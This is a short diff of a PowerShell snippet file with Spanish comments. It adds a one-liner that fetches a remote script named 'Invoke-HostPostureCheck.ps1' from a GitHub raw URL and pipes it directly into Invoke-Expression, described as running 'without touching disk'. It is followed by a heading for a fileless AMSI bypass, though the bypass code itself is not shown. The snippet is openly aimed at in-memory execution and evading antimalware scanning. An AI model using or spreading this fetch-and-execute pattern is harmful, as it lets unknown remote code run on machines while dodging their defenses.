@@ -1,5 +1,7 @@
 # Descargar el script en powershell de forma correcta
 Invoke-RestMethod "https://raw.githubusercontent.com/dixinthenet/Wnds/refs/heads/main/Invoke-HostPostureCheck.ps1" | Out-File -FilePath .\i.ps1 -Encoding utf8
+# Descargar y ejecutar sin tocar eel disco
+Invoke-RestMethod "https://raw.githubusercontent.com/dixinthenet/Wnds/refs/heads/main/Invoke-HostPostureCheck.ps1" | Invoke-Expression
 
 #FIleless + AMSI BYPASS
 # AMSI bypass
